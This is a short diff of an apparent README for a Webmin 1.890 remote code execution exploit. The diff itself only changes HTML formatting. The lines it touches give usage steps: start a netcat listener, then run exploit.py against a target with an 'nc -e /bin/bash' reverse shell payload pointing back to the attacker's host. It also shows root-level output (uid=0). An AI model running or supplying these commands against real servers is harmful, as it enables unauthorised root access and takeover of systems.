@@ -12,7 +12,7 @@ Webmin 1.890 is vulnerable to RCE if “user password change” option to be ena
 <strong>uid=0(root) gid=0(root) groups=0(root)</strong><br>
 &lt;/p&gt;
 <br>
-before running script start listener for connection in your machine<br>
+<h3>before running script start listener for connection in your machine</h3><br>
 <code>nc -nvlp [LPORT]</code> 
-run script<br>
+<br><h3>run script</h3><br>
 <code>python3 exploit.py [RHOST] "nc -e /bin/bash [LHOST] [LPORT]" </code> 
